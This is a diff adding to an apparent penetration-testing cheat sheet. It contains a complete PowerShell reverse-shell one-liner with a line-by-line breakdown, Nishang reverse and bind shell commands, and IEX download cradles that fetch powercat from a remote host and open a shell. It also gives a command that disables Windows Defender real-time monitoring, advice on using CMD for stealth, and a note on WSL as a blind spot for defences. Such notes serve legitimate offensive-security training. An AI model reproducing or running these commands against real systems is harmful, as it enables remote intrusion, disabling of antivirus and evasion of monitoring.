@@ -131,3 +131,74 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.23.
 ```powershell
 "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.172/powercat.ps1'); powercat -c 192.168.119.172 -p 443 -e cmd.exe"
 ```
+
+---
+
+## PowerShell Reverse Shell One-Liner Breakdown
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+| Component | Purpose |
+|---|---|
+| `powershell -nop -c` | Executes PowerShell with no profile (`-nop`) and runs the command block (`-c`). Use this when issuing from `cmd.exe`. |
+| `$client = New-Object System.Net.Sockets.TCPClient('IP',PORT)` | Creates a .NET TCPClient object that connects to the specified IP and port. |
+| `$stream = $client.GetStream()` | Gets the network stream for sending/receiving data. |
+| `[byte[]]$bytes = 0..65535\|%{0}` | Creates an empty 65536-byte buffer for the TCP stream. |
+| `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)` | Loops reading data from the stream into the buffer until the connection closes. |
+| `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)` | Decodes received bytes into ASCII text. |
+| `$sendback = (iex $data 2>&1 \| Out-String)` | Runs the received text as a command via `Invoke-Expression`, capturing stdout and stderr. |
+| `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '` | Appends a PowerShell-style prompt to the output. |
+| `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)` | Encodes the output back to bytes for transmission. |
+| `$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()` | Sends the command output back to the attacker. |
+| `$client.Close()` | Terminates the TCP connection when the loop exits. |
+
+#### Nishang Invoke-PowerShellTcp.ps1 (Script Form)
+
+The one-liner above also exists as a full PowerShell script in the [Nishang](https://github.com/samratashok/nishang) project. The script version supports both `-Reverse` and `-Bind` modes and includes error handling.
+
+* https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
+```powershell
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+Invoke-PowerShellTcp -Bind -Port 4444
+```
+
+---
+
+## CMD vs PowerShell
+
+Use **CMD** when:
+
+* On an older host (pre-Windows 7) where PowerShell is not available
+* You only need simple interactions/access
+* Using batch files, `net` commands, or MS-DOS native tools
+* Execution policies may block script execution
+* Stealth matters — CMD does not log command history by default
+
+Use **PowerShell** when:
+
+* You need cmdlets or custom-built scripts
+* Interacting with .NET objects rather than text output
+* Working with cloud-based services (Azure, M365)
+* Scripts use aliases or advanced automation
+* Stealth is of lesser concern
+
+Key differences: CMD processes text I/O while PowerShell uses .NET objects. CMD does not keep a session command history; PowerShell does. PowerShell is subject to Execution Policy and UAC restrictions that do not affect CMD.
+
+---
+
+## Disable Windows Defender
+
+Requires an administrative PowerShell console:
+
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+---
+
+## WSL as an Attack Vector
+
+Windows Subsystem for Linux (WSL) creates a blind spot — network requests executed from within the WSL instance are not parsed by Windows Firewall or Windows Defender. Attackers have been observed using Python3 and Linux binaries from WSL to download and execute payloads, bypassing host-based security controls. Similarly, PowerShell Core installed on Linux can carry over PowerShell functions to Linux hosts.
